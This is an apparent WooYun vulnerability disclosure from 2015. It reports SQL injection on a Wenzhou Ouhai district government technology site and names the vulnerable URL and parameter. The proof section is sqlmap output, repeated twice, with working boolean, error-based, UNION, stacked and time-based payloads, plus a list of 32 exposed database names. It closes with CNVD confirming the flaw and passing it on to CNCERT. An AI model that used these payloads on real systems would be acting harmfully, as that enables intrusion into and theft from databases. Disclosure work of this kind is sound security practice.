wybug_title: 温州市瓯海科技促进中心存在SQL注射造成32库泄露
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-06-23：	细节已通知厂商并且等待厂商处理中									2015-06-28：	厂商已经确认，细节仅向厂商公开									2015-07-08：	细节向核心白帽子及相关领域专家公开									2015-07-18：	细节向普通白帽子公开									2015-07-28：	细节向实习白帽子公开									2015-08-12：	细节向公众公开  简要描述： 32库 详细说明：  温州市瓯海科技促进中心

存在SQL注射http://www.ohkj.com/ui/Innovation_Enterprise.aspx?Type=1&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16

   漏洞证明：  
sqlmap identified the following injection points with a total of 53 HTTP(s) requests:---Parameter: Type (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Type=1 AND 2573=2573&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Type=1 AND 5138=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (5138=5138) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(112)+CHAR(113)))&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: Type=-9775 UNION ALL SELECT CHAR(113)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(113)+CHAR(100)+CHAR(75)+CHAR(89)+CHAR(66)+CHAR(117)+CHAR(84)+CHAR(121)+CHAR(112)+CHAR(111)+CHAR(72)+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(112)+CHAR(113)-- &T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: Type=1; WAITFOR DELAY '0:0:5'--&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: Type=1 WAITFOR DELAY '0:0:5'--&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: Type=(SELECT CHAR(113)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7918=7918) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(112)+CHAR(113))&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16---web server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NETback-end DBMS: Microsoft SQL Server 2005sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: Type (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Type=1 AND 2573=2573&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Type=1 AND 5138=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (5138=5138) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(112)+CHAR(113)))&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: Type=-9775 UNION ALL SELECT CHAR(113)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(113)+CHAR(100)+CHAR(75)+CHAR(89)+CHAR(66)+CHAR(117)+CHAR(84)+CHAR(121)+CHAR(112)+CHAR(111)+CHAR(72)+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(112)+CHAR(113)-- &T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: Type=1; WAITFOR DELAY '0:0:5'--&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: Type=1 WAITFOR DELAY '0:0:5'--&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: Type=(SELECT CHAR(113)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7918=7918) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(98)+CHAR(112)+CHAR(113))&T=%E9%AB%98%E6%96%B0%E6%8A%80%E6%9C%AF%E4%BC%81%EF%BF%BD?SortID=16---web server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NETback-end DBMS: Microsoft SQL Server 2005available databases [32]:[*] azfxt[*] csohghorg[*] csohzsbcom[*] cszfb[*] cxcx_ohkfq[*] hrss_gov_cn[*] kfqwgh[*] Lcedu2011[*] master[*] model[*] msdb[*] ohfz_exam[*] ohga[*] ohgh_org1[*] ohkjtecdata[*] ohtjj[*] ohtysy[*] ohww_wenwu[*] ohxjm[*] ouhai_daj[*] school_ohjg[*] shanghuiData[*] sportouhaibbs[*] tempdb[*] wzhszh[*] wzusp[*] yougoo_coop[*] yougoo_ohgxs[*] yougoo_ohjk[*] yougoo_ohzsw[*] yougoo_wzohzsw[*] zsw

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-06-28 06:40 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给浙江分中心,由其后续协调网站管理单位处置. 最新状态： 暂无
